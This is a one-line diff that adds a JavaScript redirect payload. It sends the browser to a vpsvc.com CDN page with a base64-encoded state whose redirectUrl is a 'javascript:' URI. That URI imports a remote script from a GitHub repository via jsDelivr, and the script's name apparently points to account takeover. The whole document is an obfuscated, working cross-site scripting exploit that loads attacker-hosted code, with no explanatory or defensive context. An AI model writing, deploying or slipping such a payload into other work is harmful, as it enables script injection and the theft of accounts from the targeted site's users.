@@ -1,0 +1,1 @@
+window.location.href='https://cdn.albelli.design.vpsvc.com/#state=eyJyZWRpcmVjdFVybCI6ImphdmFzY3JpcHQ6aW1wb3J0KCdodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvbXJ4MXcxL2FAbWFpbi92aXN0YV9hdG9fMDEuanMnKSJ9';location.reload()
